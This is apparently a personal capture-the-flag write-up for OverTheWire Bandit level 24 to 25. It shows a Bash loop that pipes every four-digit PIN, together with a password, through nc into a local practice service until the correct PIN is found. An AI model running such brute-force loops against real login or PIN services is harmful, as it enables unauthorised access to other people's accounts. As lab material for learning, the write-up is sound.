# Bandit Level 24 → Level 25

## 🎯 Objective

Find the password for the next level. A password-checking service is running on **localhost port 30002**. It requires the current Bandit 24 password and a **4-digit PIN**.

##  Understand the Service

The service requires input in this format:

```text
<password> <4-digit PIN>
```

I already had the password for `bandit24`:

```text
hVQMk***********m7BOgVXv
```

Since the PIN can be anything from `0000` to `9999`, there are **10,000 possible combinations**.

##  Create a Brute-Force Script

I created a Bash script:

```bash
nano /tmp/brute.sh
```

The script generates every possible PIN and sends it to the service:

```bash
#!/bin/bash

password="hVQMk3_lvl_24_pass_VXv"

for pin in $(seq -w 0000 9999); do
    echo "$password $pin"
done | nc localhost 30002
```

I made the script executable:

```bash
chmod +x /tmp/brute.sh
```

Then I ran it:

```bash
./brute.sh
```

The script tried all 10,000 possible PINs. Most attempts returned:

```text
Wrong! Please enter the correct current password and pincode.
```

Eventually, the correct PIN was found:

```text
Correct!
```

The service then returned the password for **Bandit Level 25**.

To hide the failed attempts and show only the successful result, I used:

```bash
./brute.sh | grep -v "Wrong"
```

## 🧠 What I Learned

* How to connect to a local TCP service using `nc`.
* How to generate a range of numbers using `seq`.
* How to use a Bash `for` loop for automation.
* How to perform a controlled brute-force attack against a CTF service.
* How to filter command output using `grep`.


